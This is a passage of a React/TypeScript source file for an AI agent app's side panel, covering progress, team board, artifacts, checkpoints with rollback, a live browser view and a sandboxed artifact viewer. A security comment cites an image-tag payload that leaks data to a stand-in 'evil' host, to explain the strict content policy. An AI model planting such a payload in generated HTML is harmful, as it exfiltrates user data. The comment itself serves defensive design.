import { useEffect, useRef, useState, type ReactNode } from "react";
// Emits the asset URL only; the worker itself loads lazily with the pdfjs chunk.
import pdfWorkerUrl from "pdfjs-dist/build/pdf.worker.min.mjs?url";
import {
  getArtifacts,
  getBrowserState,
  getJournalCases,
  getRoots,
  listCheckpoints,
  readArtifact,
  revealArtifact,
  rollbackCheckpoint,
  takeBrowserScreenshot,
  closeBrowser,
  type ArtifactContent,
  type ArtifactInfo,
  type Board,
  type BrowserState,
  type CheckpointTurn,
  type JournalCase,
  type RootInfo,
} from "../api";
import type { SessionInfo, TodoItem } from "../types";
import { AccessSection } from "./AccessSection";
import { BoardSection } from "./BoardPanel";
import { useI18n, type TFunction } from "../i18n";
import { Icon } from "./Icon";
import { Markdown, OPEN_ARTIFACT_EVENT } from "./Markdown";
import { openExternal } from "../tauri";

type Panel = "progress" | "artifacts" | "board" | "journal" | "team" | "files" | "checkpoints" | "browser";

// Quiet file-type icons for the artifact list (the colored kind pills read as noisy).
function kindIcon(kind: string): "file" | "fileCode" | "image" | "table" {
  if (kind === "image") return "image";
  if (kind === "html" || kind === "code") return "fileCode";
  if (kind === "csv" || kind === "sheet") return "table";
  return "file"; // markdown, text, pdf, everything else
}

// Fallback kind for an artifact: link whose path isn't in the list (yet) — mirrors the
// server's extension mapping closely enough for the viewer to pick a renderer.
function kindFromPath(path: string): string {
  const ext = (path.split(".").pop() || "").toLowerCase();
  if (["png", "jpg", "jpeg", "gif", "svg", "webp"].includes(ext)) return "image";
  if (["html", "htm"].includes(ext)) return "html";
  if (ext === "md") return "markdown";
  if (ext === "csv") return "csv";
  if (ext === "pdf") return "pdf";
  if (["py", "js", "ts", "tsx", "jsx", "json", "sh", "css"].includes(ext)) return "code";
  return "text";
}

interface Props {
  active: boolean;
  sessionId: string;
  refreshKey: number;
  toolNames: string[];
  todo: TodoItem[];
  running: boolean;
  // Fires when a full artifact preview opens/closes, so the app can auto-collapse the left nav
  // to give the preview (PDF/webpage/sheet) more room (#3).
  onPreviewChange?: (open: boolean) => void;
  // §32: the rail is the ONE session panel for every persona. Artifacts (scratch-side
  // deliverables), Files (all roots), and Access all render for every session (UX-036/037).
  showArtifacts?: boolean;
  personaId?: string;
  projectScoped?: boolean;
  workspace?: string;
  branch?: string | null;
  scratchPrimary?: boolean;
  openAccessKey?: number;
  onOpenIntegrations?: () => void;
  // Agent teams (OPE-96): App owns board data (the plan gate needs it too);
  // the rail renders the summary section and the expand affordance.
  board?: Board | null;
  onExpandBoard?: () => void;
  onOpenBoardItem?: (id: number) => void;
  // Drawer restructure (seventeenth pass): the team lives HERE, not in the sidebar —
  // member rows + the # team chat row. `isLead` also suppresses Progress (the board
  // is the lead's progress surface).
  isLead?: boolean;
  teamMembers?: SessionInfo[];
  teamChatEnabled?: boolean;
  teamChatUnread?: number;
  onOpenTeamChat?: () => void;
  onOpenWorker?: (s: SessionInfo) => void;
  // Bumped when a [.](board:) chip in the transcript is clicked — expands the Board section.
  openBoardKey?: number;
}

export function RightRail({
  active,
  sessionId,
  refreshKey,
  toolNames,
  todo,
  running,
  onPreviewChange,
  showArtifacts = true,
  personaId,
  projectScoped,
  workspace,
  branch,
  scratchPrimary,
  openAccessKey = 0,
  onOpenIntegrations,
  board,
  onExpandBoard,
  onOpenBoardItem,
  isLead = false,
  teamMembers = [],
  teamChatEnabled = false,
  teamChatUnread = 0,
  onOpenTeamChat,
  onOpenWorker,
  openBoardKey = 0,
}: Props) {
  const { t } = useI18n();
  // Seventeenth pass: every panel starts collapsed and nothing auto-expands — a count
  // chip is the maximum signal. One exception survives (solo sessions only): Progress
  // still auto-opens the first time a live turn has todos.
  const [open, setOpen] = useState<Record<Panel, boolean>>({
    progress: false,
    artifacts: false,
    board: false,
    journal: false,
    checkpoints: false,
    team: false,
    files: false,
    browser: false,
  });
  const autoOpenedProgress = useRef(false);
  useEffect(() => {
    if (!isLead && running && todo.length > 0 && !autoOpenedProgress.current) {
      autoOpenedProgress.current = true;
      setOpen((prev) => ({ ...prev, progress: true }));
    }
  }, [running, todo.length, isLead]);
  // A board chip in the transcript deep-links here: expand the Board section.
  const seenBoardKey = useRef(openBoardKey);
  useEffect(() => {
    if (openBoardKey === seenBoardKey.current) return;
    seenBoardKey.current = openBoardKey;
    setOpen((prev) => ({ ...prev, board: true }));
  }, [openBoardKey]);
  // Auto-reveal the built-in browser the first time a browser session is live
  // while the rail refreshes (App bumps `refreshKey` on browser_* tool calls) —
  // "see the work as it happens" without re-opening on every later call.
  const autoOpenedBrowser = useRef(false);
  useEffect(() => {
    if (autoOpenedBrowser.current || refreshKey <= 0) return;
    getBrowserState()
      .then((s) => {
        if (s?.open && !autoOpenedBrowser.current) {
          autoOpenedBrowser.current = true;
          setOpen((prev) => ({ ...prev, browser: true }));
        }
      })
      .catch(() => {});
  }, [refreshKey]);
  const [artifacts, setArtifacts] = useState<ArtifactInfo[]>([]);
  // UX-037 Files: the session's roots (workspace/scratch/grants) — the entry points of
  // the file explorer.
  const [rootDirs, setRootDirs] = useState<RootInfo[]>([]);
  const [journal, setJournal] = useState<JournalCase[]>([]);
  // Turn checkpoints ("time travel"): per-turn file undo points. Fetched with
  // the same refresh cycle as artifacts — every turn end bumps refreshKey.
  const [checkpoints, setCheckpoints] = useState<CheckpointTurn[] | null>(null);
  const [cpBusy, setCpBusy] = useState<number | null>(null);
  const [cpStatus, setCpStatus] = useState<string | null>(null);
  const [selected, setSelected] = useState<ArtifactInfo | null>(null);
  const [content, setContent] = useState<ArtifactContent | null>(null);

  const refreshArtifacts = () => getArtifacts(sessionId).then(setArtifacts).catch(() => setArtifacts([]));

  useEffect(() => {
    if (!active) return;
    if (showArtifacts) refreshArtifacts();
  }, [active, sessionId, refreshKey, showArtifacts]);

  useEffect(() => {
    if (!active) return;
    getRoots(sessionId).then(setRootDirs).catch(() => setRootDirs([]));
  }, [active, sessionId, refreshKey]);

  // Journal cases surface only when a board exists — same visibility rule as the
  // Board section, so plain sessions carry zero team chrome.
  useEffect(() => {
    if (!active || !board?.space) {
      setJournal([]);
      return;
    }
    getJournalCases().then(setJournal).catch(() => setJournal([]));
  }, [active, sessionId, refreshKey, board?.space]);

  // Checkpoints exist only after the first write-bearing turn; an empty/failed
  // fetch leaves them hidden (no chrome for sessions that never wrote).
  useEffect(() => {
    if (!active) return;
    listCheckpoints(sessionId)
      .then((t) => setCheckpoints(t.length ? t : []))
      .catch(() => {});
  }, [active, sessionId, refreshKey]);

  // Switching conversations closes any open artifact — it belongs to the previous session's
  // workspace, which the new session can't (and shouldn't) read.
  useEffect(() => {
    setSelected(null);
    setContent(null);
  }, [sessionId]);

  useEffect(() => {
    setContent(null);
    if (!selected) return;
    readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
  }, [selected?.path, sessionId]);

  // Notify the app when a preview opens/closes (drives the left-nav auto-collapse).
  // Edge-triggered on the ACTUAL transition — a callback-identity change must never
  // replay "open" while the viewer sits open (that re-collapsed a nav the user had
  // just expanded; owner-hit 2026-08-21).
  const prevPreviewOpen = useRef(false);
  useEffect(() => {
    const open = !!selected;
    if (open !== prevPreviewOpen.current) {
      prevPreviewOpen.current = open;
      onPreviewChange?.(open);
    }
  }, [!!selected, onPreviewChange]);

  const reloadSelected = () => {
    if (!selected) return Promise.resolve();
    setContent(null);
    return readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
  };

  // Two-step inline confirm (same vocabulary as row menus' two-step delete):
  // first click arms THIS row ("?"), second click fires the rollback. The files
  // viewer closes if open — its content may be about to be restored away — and
  // artifacts refresh (files on disk just changed).
  const doRollback = async (c: CheckpointTurn) => {
    if (cpBusy !== null) return;
    if (cpBusy !== c.seq) {
      setCpBusy(c.seq);
      return;
    }
    setCpBusy(c.seq);
    try {
      const res = await rollbackCheckpoint(sessionId, c.seq);
      if (res.ok) {
        setCpStatus(
          t("Rolled back: {restored} restored, {deleted} removed.", {
            restored: res.restored ?? 0,
            deleted: res.deleted ?? 0,
          }),
        );
        if (selected) {
          setSelected(null);
          setContent(null);
        }
        refreshArtifacts();
      } else {
        setCpStatus(res.error || t("Nothing to roll back."));
      }
    } catch {
      setCpStatus(t("Nothing to roll back."));
    } finally {
      setCpBusy(null);
    }
  };

  // §34 (UX-016): [Title](artifact:path) chips in the transcript open the viewer directly.
  // Resolve against the loaded list first; on a miss, refresh once (the file may be
  // seconds old), then fall back to a minimal record — readArtifact validates the path.
  // Registered even while the rail is HIDDEN (owner-hit 2026-08-15): the chip fires ONE
  // event, and App's unhide listener and this one race it — gating this on `active`
  // dropped the selection, so the first click only opened an empty rail.
  useEffect(() => {
    if (!sessionId) return;
    const minimal = (path: string): ArtifactInfo => ({
      path,
      name: path.split("/").pop() || path,
      kind: kindFromPath(path),
      size: 0,
      modified_at: 0,
    });
    const match = (list: ArtifactInfo[], path: string) =>
      list.find((a) => a.path === path || a.path.endsWith("/" + path) || a.name === path);
    const onOpen = (e: Event) => {
      const path = String((e as CustomEvent).detail?.path || "");
      if (!path) return;
      const found = match(artifacts, path);
      if (found) {
        setSelected(found);
        return;
      }
      getArtifacts(sessionId)
        .then((list) => {
          setArtifacts(list);
          setSelected(match(list, path) ?? minimal(path));
        })
        .catch(() => setSelected(minimal(path)));
    };
    window.addEventListener(OPEN_ARTIFACT_EVENT, onOpen);
    return () => window.removeEventListener(OPEN_ARTIFACT_EVENT, onOpen);
  }, [sessionId, artifacts]);

  if (!active) return null;

  return (
    <aside className={"right-rail" + (selected ? " artifact-mode" : "")}>
      {selected ? (
        <ArtifactViewer
          sessionId={sessionId}
          artifact={selected}
          content={content}
          onReload={reloadSelected}
          onBack={() => setSelected(null)}
          onOpenEntry={(path) =>
            setSelected({
              path,
              name: path.split("/").pop() || path,
              kind: kindFromPath(path),
              size: 0,
              modified_at: 0,
              origin: selected?.origin,
            })
          }
        />
      ) : (
        <>
          {/* Leads carry no Progress panel — the board IS the lead's progress surface. */}
          {!isLead && (
            <RailSection title={t("Progress")} open={open.progress} onToggle={() => setOpen({ ...open, progress: !open.progress })}>
              <ProgressSummary running={running} toolNames={toolNames} todo={todo} />
            </RailSection>
          )}

          {/* Agent teams (OPE-96): board summary — grouped by state, blocked on top.
              Hidden entirely until the workspace has items (no chrome for plain sessions). */}
          {board?.space && (
            <RailSection
              title={t("Board")}
              count={boardChip(t, board).text}
              countAttention={boardChip(t, board).attention}
              open={open.board}
              onToggle={() => setOpen({ ...open, board: !open.board })}
              action={
                <button
                  className="rail-mini-btn"
                  data-testid="board-expand"
                  onClick={(e) => {
                    e.stopPropagation();
                    onExpandBoard?.();
                  }}
                  title={t("Expand the board")}
                >
                  <Icon name="panelOpen" size={13} />
                </button>
              }
            >
              <BoardSection
                board={board}
                onExpand={() => onExpandBoard?.()}
                onOpenItem={onOpenBoardItem}
              />
            </RailSection>
          )}

          {/* The team panel: who's working, on what, and the way into their sessions —
              the altitude-3 escape hatch, moved here from the sidebar (RECENT keeps ONE
              entry per team: the lead). */}
          {teamMembers.length > 0 && (
            <RailSection
              title={t("Team")}
              open={open.team}
              onToggle={() => setOpen({ ...open, team: !open.team })}
              count={String(teamMembers.length)}
            >
              <div className="rail-team" data-testid="team-panel">
                {teamMembers.map((w) => (
                  <button
                    className="rail-team-row"
                    key={w.session_id}
                    data-testid={`team-row-${w.team?.actor || w.session_id}`}
                    onClick={() => onOpenWorker?.(w)}
                    title={t("Open {actor}'s session", { actor: w.team?.actor || "worker" })}
                  >
                    <span className={"team-dot " + (w.team?.status || "idle")} />
                    <span className="rail-team-name">{w.team?.actor || w.agent}</span>
                    <span className="rail-team-item">{w.team?.current_item || t("sleeping")}</span>
                    <span className="rail-team-open">{t("open ↗")}</span>
                  </button>
                ))}
                {teamChatEnabled && onOpenTeamChat && (
                  <button className="rail-team-row rail-chat-row" data-testid="team-chat-row" onClick={onOpenTeamChat}>
                    <span className="team-hash">#</span>
                    <span className="rail-team-name">{t("team chat")}</span>
                    {teamChatUnread > 0 && <span className="team-chat-badge">{teamChatUnread}</span>}
                  </button>
                )}
              </div>
            </RailSection>
          )}

          {showArtifacts && (
          <RailSection
            title={t("Artifacts")}
            count={artifacts.length ? String(artifacts.length) : undefined}
            open={open.artifacts}
            onToggle={() => setOpen({ ...open, artifacts: !open.artifacts })}
            action={
              <>
                {artifacts.length > 0 && (
                  <button
                    className="rail-mini-btn"
                    onClick={(e) => { e.stopPropagation(); revealArtifact(sessionId, artifacts[0].path, "reveal"); }}
                    title={t("Show the folder where these files are saved")}
                  >
                    <Icon name="folder" size={13} />
                  </button>
                )}
                <button className="rail-mini-btn" onClick={(e) => { e.stopPropagation(); refreshArtifacts(); }} title={t("Refresh artifacts")}><Icon name="refresh" size={13} /></button>
              </>
            }
          >
            {artifacts.length === 0 ? (
              <div className="rail-muted">{t("No previewable files yet.")}</div>
            ) : (
              <div className="artifact-list">
                {artifacts.slice(0, 16).map((a) => (
                  <button className="artifact-row" key={a.path} onClick={() => setSelected(a)}>
                    <span className="artifact-ico" title={a.kind}>
                      <Icon name={kindIcon(a.kind)} size={17} />
                    </span>
                    <span className="artifact-name">
                      {a.name}
                      <span className="artifact-row-meta">{formatBytes(a.size)} · {formatTime(a.modified_at)}</span>
                    </span>
                    <span className="artifact-open">{t("Open")}</span>
                  </button>
                ))}
              </div>
            )}
          </RailSection>
          )}

          {/* The More fold is gone (owner call 2026-08-20): every section lists flat,
              collapsed by default — with Files added, one extra click hid half the
              drawer for no gain. */}
          {board?.space && journal.length > 0 && (
            <RailSection
              title={t("Journal")}
              count={String(journal.length)}
              open={open.journal}
              onToggle={() => setOpen({ ...open, journal: !open.journal })}
            >
              <div className="journal-list" data-testid="journal-list">
                {journal.map((c) => (
                  <div className="journal-row" key={c.case}>
                    <Icon name="file" size={13} />
                    <span className="journal-case">{c.case}</span>
                    <span className="journal-count">{c.entries === 1 ? t("1 entry") : t("{n} entries", { n: c.entries })}</span>
                  </div>
                ))}
              </div>
            </RailSection>
          )}
          {/* §32: Access — the former Session-settings drawer, one section among peers.
              key: its data ownership resets with the conversation, like the old row did. */}
          {(checkpoints?.length ?? 0) > 0 && (
            <RailSection
              title={t("Checkpoints")}
              count={String(checkpoints!.length)}
              open={open.checkpoints}
              onToggle={() => setOpen({ ...open, checkpoints: !open.checkpoints })}
            >
              <div className="journal-list" data-testid="checkpoints-list">
                {[...checkpoints!].reverse().map((c) => {
                  const trackable = c.files.filter((f) => !f.skipped).length;
                  const skipped = c.files.length - trackable;
                  return (
                    <div className="journal-row" key={c.seq} data-testid={`checkpoint-${c.seq}`}>
                      <Icon name="clock" size={13} />
                      <span className="journal-case" title={c.user}>
                        #{c.seq} · {formatTime(c.ts)}
                      </span>
                      <span className="journal-count">
                        {trackable === 1 ? t("1 file") : t("{n} files", { n: trackable })}
                        {skipped > 0 ? t(" · {n} skipped", { n: skipped }) : ""}
                      </span>
                      <button
                        className="rail-mini-btn"
                        data-testid={`checkpoint-rollback-${c.seq}`}
                        disabled={cpBusy !== null}
                        title={cpBusy === c.seq ? t("Confirm rollback?") : t("Restore files to the end of this turn")}
                        onClick={() => void doRollback(c)}
                      >
                        {cpBusy === c.seq ? "?" : <Icon name="refresh" size={12} />}
                      </button>
                    </div>
                  );
                })}
              </div>
              {cpStatus && (
                <div className="rail-muted" data-testid="checkpoint-status" style={{ marginTop: 6 }}>
                  {cpStatus}
                </div>
              )}
            </RailSection>
          )}
          {/* UX-037: Files — an explorer over the session's roots. Each root opens in
              the artifact viewer, whose folder listings already click through; the
              Artifacts section stays the curated scratch-only surface. */}
          {rootDirs.length > 0 && (
            <RailSection
              title={t("Files")}
              count={String(rootDirs.length)}
              open={open.files}
              onToggle={() => setOpen({ ...open, files: !open.files })}
            >
              <div className="artifact-list" data-testid="files-roots">
                {rootDirs.map((r) => (
                  <button
                    className="artifact-row"
                    key={r.path}
                    data-testid="files-root-row"
                    onClick={() =>
                      setSelected({
                        path: r.path,
                        abs_path: r.path,
                        name: r.label || r.path.split("/").pop() || r.path,
                        kind: "folder",
                        size: 0,
                        modified_at: 0,
                        origin: "files",
                      })
                    }
                    title={r.path}
                  >
                    <span className="artifact-ico">
                      <Icon name="folder" size={17} />
                    </span>
                    <span className="artifact-name">
                      {r.label || r.path.split("/").pop() || r.path}
                      <span className="artifact-row-meta">
                        {r.writable ? t("read-write") : t("read-only")}
                        {!r.exists ? t(" · missing") : ""}
                      </span>
                    </span>
                    <span className="artifact-open">{t("Browse")}</span>
                  </button>
                ))}
              </div>
            </RailSection>
          )}

          {/* Built-in browser: a live, user-visible window into the Playwright
              session the worker drives. Polls only while the section is open;
              App bumps `refreshKey` on every browser_* tool call so the panel
              refreshes the moment the worker navigates/clicks. */}
          <RailSection
            title={t("Browser")}
            open={open.browser}
            onToggle={() => setOpen({ ...open, browser: !open.browser })}
          >
            <BrowserPanel refreshKey={refreshKey} />
          </RailSection>

          {/* §32: Access — the former Session-settings drawer, one section among peers.
              key: its data ownership resets with the conversation, like the old row did. */}
          <div>
            <AccessSection
              key={sessionId}
              sessionId={sessionId}
              personaId={personaId}
              projectScoped={projectScoped}
              workspace={workspace}
              branch={branch}
              scratchPrimary={scratchPrimary}
              openKey={openAccessKey}
              onOpenIntegrations={onOpenIntegrations}
            />
          </div>
        </>
      )}
    </aside>
  );
}

// The Board section's header chip: the attention states (blocked/review) when present,
// otherwise a quiet active count. Full per-state summary stays on the topbar button.
function boardChip(t: TFunction, board: Board): { text: string; attention: boolean } {
  const counts: Record<string, number> = {};
  for (const item of board.items) counts[item.state] = (counts[item.state] || 0) + 1;
  const attn: string[] = [];
  if (counts.blocked) attn.push(t("{n} blocked", { n: counts.blocked }));
  if (counts.review) attn.push(t("{n} review", { n: counts.review }));
  if (attn.length) return { text: attn.join(" · "), attention: true };
  const active = (counts.in_progress || 0) + (counts.open || 0);
  return { text: active ? t("{n} active", { n: active }) : "", attention: false };
}

function ProgressSummary({ running, toolNames, todo }: { running: boolean; toolNames: string[]; todo: TodoItem[] }) {
  const { t } = useI18n();
  // Task-chunking tools run several read-only subagents in parallel worker
  // threads; surface that state so the user sees the fan-out happening.
  const delegating = toolNames.some(
    (n) => n === "delegate_parallel" || n === "explore",
  );
  if (todo.length) {
    return (
      <div className="rail-todo-list">
        {todo.map((item, index) => (
          <div className={"rail-todo " + item.status} key={index}>
            <span className="rail-todo-mark" />
            <span>{item.content}</span>
          </div>
        ))}
        {running && (
          <div className="rail-muted">
            {delegating
              ? t("Running subagents in parallel…")
              : toolNames.length === 1
                ? t("1 tool call so far.")
                : toolNames.length
                  ? t("{n} tool calls so far.", { n: toolNames.length })
                  : t("Working...")}
          </div>
        )}
      </div>
    );
  }
  if (running) {
    return (
      <div className="rail-muted">
        {t("Working on this task")}
        {delegating
          ? ` ${t("Running subagents in parallel…")}`
          : toolNames.length === 1
            ? t(" with 1 tool call so far.")
            : toolNames.length
              ? t(" with {n} tool calls so far.", { n: toolNames.length })
              : "."}
      </div>
    );
  }
  return (
    <div className="rail-muted">
      {t("For longer multi-step tasks, progress will appear here while OpenWorker plans, uses tools, waits for approval, and produces artifacts.")}
    </div>
  );
}

function RailSection({
  title,
  open,
  onToggle,
  children,
  action,
  count,
  countAttention,
}: {
  title: string;
  open: boolean;
  onToggle: () => void;
  children: ReactNode;
  action?: ReactNode;
  // The header's maximum signal: a small count chip; amber when it carries attention
  // states (blocked/review). Panels never shout louder than this.
  count?: string;
  countAttention?: boolean;
}) {
  return (
    <section className="rail-section">
      <div className="rail-section-head">
        <button
          className="rail-section-toggle"
          data-testid={`rail-toggle-${title.toLowerCase()}`}
          onClick={onToggle}
        >
          <Icon name={open ? "chevronDown" : "chevronRight"} size={14} className="rail-chev" />
          <span>{title}</span>
          {count && (
            <span className={"rail-count" + (countAttention ? " attention" : "")}>{count}</span>
          )}
        </button>
        {action}
      </div>
      {open && <div className="rail-section-body">{children}</div>}
    </section>
  );
}

// Live view of the worker's built-in browser (the singleton Playwright session
// behind the browser_* tools). Polls while mounted (the RailSection only
// renders children when open); refreshes immediately when a browser tool call
// lands via `refreshKey`. The screenshot is a data URL served by the sidecar.
function BrowserPanel({ refreshKey }: { refreshKey: number }) {
  const { t } = useI18n();
  const [state, setState] = useState<BrowserState | null>(null);
  const [busy, setBusy] = useState(false);

  useEffect(() => {
    let cancelled = false;
    const load = () =>
      getBrowserState()
        .then((s) => {
          if (!cancelled) setState(s);
        })
        .catch(() => {});
    load();
    const timer = setInterval(load, 2000);
    return () => {
      cancelled = true;
      clearInterval(timer);
    };
  }, [refreshKey]);

  const screenshot = async () => {
    setBusy(true);
    try {
      const s = await takeBrowserScreenshot();
      if (s.ok === false || s.error) {
        // keep the state but surface the error through the status line
        setState((prev) => prev && { ...prev, last_error: s.error || "", status: "error" });
      } else {
        setState(s);
      }
    } catch {
      /* poll will recover */
    } finally {
      setBusy(false);
    }
  };

  const close = async () => {
    setBusy(true);
    try {
      await closeBrowser();
    } catch {
      /* poll will recover */
    } finally {
      setBusy(false);
    }
    getBrowserState().then(setState).catch(() => {});
  };

  if (!state) {
    return <div className="rail-muted">{t("Checking browser…")}</div>;
  }
  if (!state.open) {
    return (
      <div>
        <div className="rail-muted" data-testid="browser-closed">
          {t("No browser session is open.")}
        </div>
        <div className="rail-row-actions" style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
          <button className="rail-mini-btn" onClick={screenshot} disabled={busy} data-testid="browser-shot-btn">
            <Icon name="image" size={13} /> {t("Screenshot")}
          </button>
        </div>
      </div>
    );
  }
  return (
    <div className="browser-panel" data-testid="browser-panel">
      {state.screenshot_data_url ? (
        <img
          className="browser-shot"
          src={state.screenshot_data_url}
          alt={t("Browser screenshot")}
          data-testid="browser-screenshot"
        />
      ) : (
        <div className="rail-muted" style={{ marginBottom: 6 }}>
          {t("No screenshot yet.")}
        </div>
      )}
      <div className="browser-url" title={state.url}>
        {state.url || t("(no page)")}
      </div>
      {state.title ? <div className="rail-muted">{state.title}</div> : null}
      <div className="rail-muted">
        {t("Status: {status}", { status: state.status })}
        {state.last_action ? ` · ${t("last: {action}", { action: state.last_action })}` : ""}
      </div>
      {state.last_result === "error" && state.last_error ? (
        <div className="rail-muted" style={{ color: "var(--danger, #dc2626)" }} data-testid="browser-error">
          {state.last_error}
        </div>
      ) : null}
      <div className="rail-row-actions" style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
        <button className="rail-mini-btn" onClick={screenshot} disabled={busy} data-testid="browser-shot-btn">
          <Icon name="image" size={13} /> {t("Screenshot")}
        </button>
        {state.url ? (
          <button
            className="rail-mini-btn"
            onClick={() => openExternal(state.url)}
            title={state.url}
            data-testid="browser-open-external"
          >
            <Icon name="panelOpen" size={13} /> {t("Open in browser")}
          </button>
        ) : null}
        <button className="rail-mini-btn" onClick={close} disabled={busy} data-testid="browser-close-btn">
          <Icon name="x" size={13} /> {t("Close browser")}
        </button>
      </div>
    </div>
  );
}

// OPE-91: agent-authored HTML is untrusted active content rendered inside the PRIVILEGED
// app webview (Tauri IPC). The sandbox must therefore be airtight on two axes:
//  - no `allow-same-origin`: with srcDoc, that flag would run the page same-origin with
//    the app — scripts could reach the parent document and the IPC bridge.
//  - no network: a poisoned report exfiltrates at DISPLAY time via subresources
//    (<img src="https://evil/?leak=…">). The injected CSP allows inline style/script
//    (what report interactivity needs) and data: images; everything remote is blocked.
// Injected at position 0 so it takes effect before any content the page declares.
const ARTIFACT_CSP =
  '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; ' +
  "style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;\">";

function sandboxHtml(html: string): string {
  return ARTIFACT_CSP + html;
}

function ArtifactViewer({
  sessionId,
  artifact,
  content,
  onReload,
  onBack,
  onOpenEntry,
}: {
  sessionId: string;
  artifact: ArtifactInfo;
  content: ArtifactContent | null;
  onReload: () => Promise<void>;
  onBack: () => void;
  // Folder listings: open a child entry in the viewer (files and subfolders alike).
  onOpenEntry?: (path: string) => void;
}) {
  const { t } = useI18n();
  const [reloadKey, setReloadKey] = useState(0);
  // UX-038: the ambiguous icon cluster collapsed into ONE labeled ⋯ menu; the
  // breadcrumb parent is the back action and ✕ closes. Copy CONTENTS is the
  // primary copy — the path copy (a 2026-07-12 tester fix) lives under it, labeled.
  const [menuOpen, setMenuOpen] = useState(false);
  const menuRef = useRef<HTMLDivElement | null>(null);
  useEffect(() => {
    if (!menuOpen) return;
    const close = (e: MouseEvent) => {
      if (!menuRef.current?.contains(e.target as Node)) setMenuOpen(false);
    };
    window.addEventListener("mousedown", close);
    return () => window.removeEventListener("mousedown", close);
  }, [menuOpen]);
  const isHtml = content?.kind === "html" && !content.error;
  // Best viewed in a real app: spreadsheets, PDFs, and Office docs (pptx/docx can't preview inline)
  const isApp = content?.kind === "sheet" || content?.kind === "pdf" || content?.kind === "office";
  // Text-bearing kinds can copy their contents; images/PDFs/sheets have nothing textual to copy.
  const copyableText = typeof content?.content === "string" && !content?.error;
  const crumbRoot = artifact.origin === "files" ? t("Files") : t("Artifacts");
  const item = (
    testid: string,
    icon: Parameters<typeof Icon>[0]["name"],
    label: string,
    onClick: () => void,
  ) => (
    <button
      className="artifact-menu-item"
      data-testid={testid}
      onClick={() => {
        setMenuOpen(false);
        onClick();
      }}
    >
      <Icon name={icon} size={14} />
      <span>{label}</span>
    </button>
  );

  return (
    <div className="artifact-viewer">
      <div className="artifact-head">
        <div className="artifact-heading">
          <div className="artifact-title">
            <button
              className="artifact-crumb-link"
              data-testid="artifact-crumb-back"
              onClick={onBack}
              title={t("Back to {root}", { root: crumbRoot })}
            >
              {crumbRoot}
            </button>
            <span className="artifact-sep">/</span>
            <span>{artifact.name}</span>
          </div>
          <div className="artifact-path">{artifact.path}</div>
        </div>
        <div className="rail-actions">
          {isHtml && (
            <button
              className="artifact-icon-btn"
              onClick={async () => {
                await onReload();
                setReloadKey((k) => k + 1);
              }}
              aria-label={t("Reload preview")}
              title={t("Reload")}
            >
              <Icon name="refresh" size={16} />
            </button>
          )}
          <div className="artifact-menu-wrap" ref={menuRef}>
            <button
              className="artifact-icon-btn"
              data-testid="artifact-more"
              aria-label={t("More actions")}
              title={t("More")}
              onClick={() => setMenuOpen((v) => !v)}
            >
              <Icon name="moreHorizontal" size={16} />
            </button>
            {menuOpen && (
              <div className="artifact-menu" data-testid="artifact-menu">
                {copyableText &&
                  item("artifact-copy-contents", "copy", t("Copy contents"), () =>
                    navigator.clipboard?.writeText(content?.content || ""),
                  )}
                {item("artifact-copy-path", "file", t("Copy path"), () =>
                  navigator.clipboard?.writeText(artifact.abs_path || artifact.path),
                )}
                <div className="artifact-menu-div" />
                {isHtml &&
                  item("artifact-open-browser", "panelOpen", t("Open in browser"), () =>
                    revealArtifact(sessionId, artifact.path, "open"),
                  )}
                {isApp &&
                  item("artifact-open-app", "panelOpen", t("Open in default app"), () =>
                    revealArtifact(sessionId, artifact.path, "open"),
                  )}
                {item("artifact-reveal", "folder", t("Reveal in Finder"), () =>
                  revealArtifact(sessionId, artifact.path, "reveal"),
                )}
              </div>
            )}
          </div>
          <button
            className="artifact-icon-btn"
            data-testid="artifact-close"
            onClick={onBack}
            aria-label={t("Close the viewer")}
            title={t("Close")}
          >
            <Icon name="x" size={16} />
          </button>
        </div>
      </div>
      <div className="artifact-preview">
        {!content ? (
          <div className="rail-muted">{t("Loading...")}</div>
        ) : content.error ? (
          <div className="rail-error">{content.error}</div>
        ) : content.kind === "html" ? (
          <iframe
            key={`${artifact.path}-${reloadKey}`}
            sandbox="allow-scripts"
            className="artifact-frame"
            data-testid="artifact-frame"
            srcDoc={sandboxHtml(content.content || "")}
          />
        ) : content.kind === "markdown" ? (
          <div className="artifact-md">
            <Markdown text={content.content || ""} />
          </div>
        ) : content.kind === "image" ? (
          <img className="artifact-image" src={content.data_url} />
        ) : content.kind === "pdf" ? (
          <PdfViewer dataUrl={content.data_url || ""} />
        ) : content.kind === "csv" ? (
          <CsvTable text={content.content || ""} />
        ) : content.kind === "sheet" ? (
          <SheetViewer dataUrl={content.data_url || ""} />
        ) : content.kind === "folder" ? (
          // A linked directory (e.g. a skill package): render the listing, click through.
          <div className="artifact-folderlist" data-testid="artifact-folder">
            {(content.entries || []).map((e) => (
              <button
                key={e.name}
                className="artifact-folder-row"
                onClick={() => onOpenEntry?.(`${artifact.path.replace(/\/+$/, "")}/${e.name}`)}
              >
                <Icon name={e.dir ? "folder" : "file"} size={14} />
                <span className="artifact-folder-name">{e.name}</span>
                {!e.dir && <span className="artifact-folder-size">{formatBytes(e.size)}</span>}
              </button>
            ))}
            {!content.entries?.length && <div className="rail-muted">{t("This folder is empty.")}</div>}
          </div>
        ) : content.kind === "office" ? (
          <div className="artifact-open-prompt">
            <Icon name="panelOpen" size={28} />
            <p>{t("This {kind} file can't be previewed here.", { kind: /\.pptx?$/i.test(artifact.name) ? "PowerPoint" : "Word" })}</p>
            <button className="btn sm" onClick={() => revealArtifact(sessionId, artifact.path, "open")}>
              {t("Open in default app")}
            </button>
          </div>
        ) : (
          <pre className="artifact-code">{content.content}</pre>
        )}
      </div>
    </div>
  );
}

const MAX_TABLE_ROWS = 500;

function GridTable({ rows, note }: { rows: unknown[][]; note?: string }) {
  const { t } = useI18n();
  const [head, ...body] = rows;
  return (
    <div className="artifact-tablewrap">
      <table className="artifact-table">
        {head && (
          <thead>
            <tr>{head.map((c, i) => <th key={i}>{String(c ?? "")}</th>)}</tr>
          </thead>
        )}
        <tbody>
          {body.slice(0, MAX_TABLE_ROWS).map((r, i) => (
            <tr key={i}>{r.map((c, j) => <td key={j}>{String(c ?? "")}</td>)}</tr>
          ))}
        </tbody>
      </table>
      {(note || body.length > MAX_TABLE_ROWS) && (
